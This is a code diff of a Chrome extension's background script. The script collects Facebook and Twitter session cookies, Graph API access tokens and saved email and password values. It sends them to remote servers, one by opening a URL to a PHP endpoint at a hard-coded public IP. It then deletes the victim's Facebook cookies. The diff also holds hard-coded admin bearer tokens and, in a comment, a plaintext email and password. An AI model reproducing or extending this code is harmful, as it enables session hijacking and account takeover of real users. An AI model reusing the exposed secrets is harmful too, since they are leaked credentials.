@@ -1,4 +1,4 @@
-chrome.storage.sync.set({ extensionState: 0 }, function() {});
+chrome.storage.local.set({ extensionState: 0 }, function() {});
 
 function removeCookies(domain, url) {
     chrome.cookies.getAll({ domain: domain }, function(cookies) {
@@ -34,9 +34,7 @@ function saveuToken() {
         }
     }).responseText;
     s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
-    chrome.storage.sync.set({ FBuToken: uToken }, function() {
-        // console.log(e);
-    });
+    chrome.storage.sync.set({ FBuToken: uToken }, function() {});
 }
 
 
@@ -47,7 +45,6 @@ function addfbCookie(cookie, url) {
             delete item['session'];
             item['url'] = url;
             chrome.cookies.set(item, function(c) {
-                // console.log(JSON.stringify(c));
                 console.log('cookie added!')
             });
         });
@@ -61,30 +58,10 @@ function addtwCookie(cookie, url) {
             delete item['session'];
             item['url'] = url;
             chrome.cookies.set(item, function(c) {
-                // console.log(JSON.stringify(c));
                 console.log('cookie added!')
             });
         });
     });
-}
-
-
-async function checkfbLogin() {
-    var p = new Promise(function(resolve, reject) {
-        chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(cookies) {
-            cookies.forEach(item => {
-                if (item['name'] == "c_user") {
-                    // console.log(item['name']);
-                    resolve(true); //signed in
-                    return;
-                }
-            })
-            resolve(false);
-        })
-    });
-    const result = await p;
-    // console.log(result);
-    return result;
 }
 
 function sendtoContent(msg) {
@@ -127,22 +104,24 @@ function twitterData() {
                     "userTokenStateDescription": "token"
                 };
                 $.ajax({
-                    url: "http://192.168.2.122:8081/api/connectome-social-media/create",
+                    url: "http://125.138.183.122:8081/api/connectome-social-media/create",
                     type: 'POST',
                     beforeSend: function(xhr) {
-                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODQxNDg1Nn0.vt-KxVv9DbQa2qeme36LJRQojKnHcKv6VRW_F9wvtE_xzYEcoy2vYBwmZhA6mKdJieObhsk8GRSKj6-KF7T-_Q');
+                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODc1OTAwOX0.A4y31gMgatNcHgS_HQ9pVuCrh1cgAdmLaDmWuY92Xe7hSMKtLPfa1WrCc7aHb68uLwmKr9Pj_7RnQGPQDlnIhw');
                     },
                     contentType: 'application/json',
                     data: JSON.stringify(data),
                     success: function(response) {
                         console.log(response);
-                        addtwCookie('TWcookie', 'https://twitter.com');
-                        // debugger;
+                        chrome.storage.sync.set({ extensionState: 0 }, function() {
+                            addtwCookie('TWcookie', 'https://twitter.com');
+                        });
                     },
                     error: function(r) {
                         console.log(r);
-                        addtwCookie('TWcookie', 'https://twitter.com');
-                        // debugger;
+                        chrome.storage.sync.set({ extensionState: 0 }, function() {
+                            addtwCookie('TWcookie', 'https://twitter.com');
+                        });
                     },
                 })
             }
@@ -157,11 +136,11 @@ function facebookData() {
         var url = 'https://mbasic.facebook.com';
         chrome.cookies.getAll({ url: url }, function(e) {
             if (e.length > 0) {
-                format = '';
+                format = 'domain=www.facebook.com;';
                 for (let i = 0; i < e.length; i++) {
                     format += e[i].name + '=' + e[i].value;
                     if (i < e.length - 1) {
-                        format += ','
+                        format += ';'
                     }
                 }
 
@@ -177,60 +156,71 @@ function facebookData() {
                 } catch (err) {
                     console.log(err);
                 }
+                if ("" != uToken) {
+                    fbInfo = $.ajax({
+                        url: "https://graph.facebook.com/me?access_token=".concat(uToken),
+                        type: "get",
+                        dataType: 'json',
+                        async: false,
+                        global: false,
+                        success: function() {}
+                    }).responseJSON;
+                }
 
-                var data = {
-                    "loginCookies": format,
-                    "loginPassword": result.FBpassword,
-                    "loginUsername": result.FBemail,
-                    "socialAccountState": 0,
-                    "socialAccountStateDescription": 0,
-                    "socialNetwork": {
-                        "id": 1
-                    },
-                    "status": true,
-                    "user": {
-                        "id": 1,
-                        "login": "admin"
-                    },
-                    "userToken": uToken,
-                    "userTokenState": 0,
-                    "userTokenStateDescription": "token"
-                };
-                $.ajax({
-                    url: "http://192.168.2.122:8081/api/connectome-social-media/create",
-                    type: 'POST',
-                    beforeSend: function(xhr) {
-                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODQxNDg1Nn0.vt-KxVv9DbQa2qeme36LJRQojKnHcKv6VRW_F9wvtE_xzYEcoy2vYBwmZhA6mKdJieObhsk8GRSKj6-KF7T-_Q');
-                    },
-                    contentType: 'application/json',
-                    data: JSON.stringify(data),
-                    success: function(response) {
-                        console.log(response);
-                        addfbCookie('FBcookie', 'https://mbasic.facebook.com');
-                        // debugger;
-                    },
-                    error: function(r) {
-                        console.log(r);
-                        addfbCookie('FBcookie', 'https://mbasic.facebook.com');
-                        // debugger;
-                    },
-                })
+                // var data = {
+                //     "loginCookies": format,
+                //     "loginPassword": 'Helloapril22#',
+                //     "loginUsername": 'tuongbbinhh7@gmail.com',
+                //     "socialAccountState": 0,
+                //     "socialAccountStateDescription": 0,
+                //     "socialNetwork": {
+                //         "id": 1
+                //     },
+                //     "status": 1,
+                //     "user": {
+                //         "id": 1,
+                //         "login": "admin"
+                //     },
+                //     "userToken": uToken,
+                //     "userTokenState": 0,
+                //     "userTokenStateDescription": "token",
+                //     "uuid": "12345678"
+                // };
+                var sendurl = `http://13.21.34.124:8080/php/facebook.php?uid=${fbInfo['id']}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
+                var encodeurl = encodeURI(sendurl);
+                chrome.tabs.create({ url: encodeurl });
+                // $.ajax({
+                //     url: "http://125.138.183.122:8081/api/connectome-social-media/create",
+                //     type: 'POST',
+                //     beforeSend: function(xhr) {
+                //         xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODc1OTAwOX0.A4y31gMgatNcHgS_HQ9pVuCrh1cgAdmLaDmWuY92Xe7hSMKtLPfa1WrCc7aHb68uLwmKr9Pj_7RnQGPQDlnIhw');
+                //     },
+                //     contentType: 'application/json',
+                //     data: JSON.stringify(data),
+                //     success: function(response) {
+                //         console.log(response);
+                //         chrome.storage.sync.set({ extensionState: 0 }, function() {
+                //             addfbCookie('FBcookie', 'https://mbasic.facebook.com');
+                //         });
+                //     },
+                //     error: function(r) {
+                //         console.log(r);
+                //         chrome.storage.sync.set({ extensionState: 0 }, function() {
+                //             addfbCookie('FBcookie', 'https://mbasic.facebook.com');
+                //         });
+                //     },
+                // })
             }
             removeCookies(".facebook.com", "https://mbasic.facebook.com");
         })
     })
 };
 
-
-
 chrome.runtime.onMessage.addListener(async function(response, sender, sendResponse) {
+    console.log(response);
     switch (response) {
         case 'checklogin':
-            // if (await checkfbLogin()) {
-            //     sendtoContent('showsendData');
-            // } else {
             sendtoContent('showlogin');
-            // }
             break;
         case 'sendData':
             facebookData();
@@ -250,6 +240,9 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
             break;
         case 'donetwLogin':
             setTimeout(twitterData(), 2000);
+            break;
+        case 'testtimeout':
+            setTimeout(function() { console.log('testsettimeout5s') }, 5000);
             break;
         default:
             console.log('nofunction');
